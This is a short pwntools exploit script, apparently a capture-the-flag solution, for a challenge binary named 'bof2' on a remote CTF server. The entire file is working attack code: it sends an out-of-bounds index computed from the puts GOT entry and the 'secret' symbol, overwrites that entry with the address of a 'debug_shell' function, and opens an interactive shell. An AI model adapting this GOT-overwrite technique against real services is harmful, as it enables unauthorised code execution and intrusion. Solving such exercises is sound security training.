#!/usr/bin/env python2
from pwn import *

file = './bof2'
# server, port = 'localhost'  , 9999
server, port = 'csie.ctf.tw', 10126

r, context.binary = remote(server, port), file
# ========================================================================

e = ELF(file)

r.recvuntil("Do you know all of the secrets ?\n")
r.recvuntil("Which secret do you want to guess ? (0~3)\n")
r.sendline(str( ( e.got['puts'] - e.symbols['secret'] ) / 8 ))

r.recvuntil("What's the secret ?\n")
r.sendline(str( e.symbols['debug_shell'] ))

r.interactive()
